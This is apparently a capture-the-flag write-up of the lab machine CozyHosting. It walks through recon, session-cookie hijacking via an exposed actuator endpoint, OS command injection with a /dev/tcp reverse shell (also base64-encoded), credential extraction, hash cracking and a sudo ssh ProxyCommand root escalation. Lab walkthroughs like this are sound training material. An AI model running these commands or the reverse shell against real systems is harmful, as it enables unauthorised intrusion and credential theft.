

![1](</Writeups/Machines/CozyHosting/img/logo.png>)
By Rug4lo

## Reconnaissance 

We start with the usual nmap scan
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.230
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-12 18:05 CEST
Initiating SYN Stealth Scan at 18:05
Scanning 10.10.11.230 [65535 ports]
Discovered open port 80/tcp on 10.10.11.230
Discovered open port 22/tcp on 10.10.11.230
Completed SYN Stealth Scan at 18:05, 16.75s elapsed (65535 total ports)
Nmap scan report for 10.10.11.230
Host is up, received user-set (0.10s latency).
Scanned at 2023-09-12 18:05:30 CEST for 16s
Not shown: 65023 closed tcp ports (reset), 509 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.88 seconds
           Raw packets sent: 82953 (3.650MB) | Rcvd: 77523 (3.101MB)
```

Then we run a scan with the basic reconnaissance scripts 

```bash
nmap -sCV -p22,80 -oN targeted 10.10.11.230
```

```bash
# Nmap 7.93 scan initiated Sun Sep  3 16:58:58 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  3 16:59:09 2023 -- 1 IP address (1 host up) scanned in 10.41 seconds
```

On port 80 there is a website with a login

![1](</Writeups/Machines/CozyHosting/img/1.png>)

Given this, we can do directory discovery with [[Dirsearch]] 

```bash
sudo dirsearch -u http://cozyhosting.htb
```
```bash
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/cozyhosting.htb/_23-09-12_18-14-31.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-09-12_18-14-31.log

Target: http://cozyhosting.htb/

[18:14:32] Starting: 
[18:14:41] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[18:14:43] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[18:14:44] 400 -  435B  - /a%5c.aspx
[18:14:45] 200 -  634B  - /actuator
[18:14:45] 200 -    5KB - /actuator/env
[18:14:45] 200 -   15B  - /actuator/health
[18:14:45] 200 -   10KB - /actuator/mappings
[18:14:45] 200 -   98B  - /actuator/sessions
[18:14:45] 200 -  124KB - /actuator/beans
[18:14:46] 401 -   97B  - /admin
[18:15:00] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[18:15:00] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[18:15:01] 500 -   73B  - /error
[18:15:01] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[18:15:01] 200 -    0B  - /extjs/resources//charts.swf
[18:15:05] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[18:15:06] 200 -   12KB - /index
[18:15:08] 200 -    4KB - /login
[18:15:08] 200 -    0B  - /login.wdm%2e
[18:15:09] 204 -    0B  - /logout
[18:15:17] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed
```

## Cookie hijacking

Here we'll see a very interesting endpoint (/actuator/sessions); if we browse to it

![1](</Writeups/Machines/CozyHosting/img/2.png>)

Here we can see the cookie of the user  kanderson, so we can perform cookie hijacking to log in as the user kanderson

We'll go to the login page and swap our cookie for kanderson's

![1](</Writeups/Machines/CozyHosting/img/3.png>)

After reloading the page we'll see that we are in /admin

![1](</Writeups/Machines/CozyHosting/img/4.png>)

Here we'll see that there is a section to enter a hostname and a username; if we intercept the request with [[Burpsuite]]

## Os Command Injection

If we poke around a bit we'll see that we are able to inject commands (in my case I went for a reverse shell)

![1](</Writeups/Machines/CozyHosting/img/5.png>)

The base64 command I injected was this reverse shell for ssh (setting up a netcat listener beforehand, obviously)

```bash
sh -i >& /dev/tcp/10.10.14.103/4444 0>&1
-
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzgvNDQ0NCAwPiYx
```

When we send the request it will give us an interactive shell

But if we run whoami we can see that we are app, who doesn't have access to the user flag

First of all we look at the directory we're in and we see a file called **cloudhosting-0.0.1.jar**

We can spin up a python server to download this .jar 

```bash
python3 -m http.server 4646
```

And we download the file

![1](</Writeups/Machines/CozyHosting/img/6.png>)

Once downloaded we'll see that it has pulled down two files

![1](</Writeups/Machines/CozyHosting/img/7.png>)

If we extract it 

```bash
jar -xvf cloudhosting-0.0.1.jar
```

## PostgreSQL

We'll find a file that reveals the database and the password

![1](</Writeups/Machines/CozyHosting/img/8.png>)

If we connect to the database 

![1](</Writeups/Machines/CozyHosting/img/9.png>)

We can keep digging until we find the user's password for ssh

![1](</Writeups/Machines/CozyHosting/img/10.png>)

## Cracking hashes 

We can see that the passwords are hashed, so we can use John to crack them 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Now we can connect over ssh and enter the password

![1](</Writeups/Machines/CozyHosting/img/11.png>)

And we now have the user flag

## Privilege escalation

Now we have to get the root flag. For this we can see that we are allowed to run ssh as root, and we can use that to escalate privileges

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

This way we get an sh as root
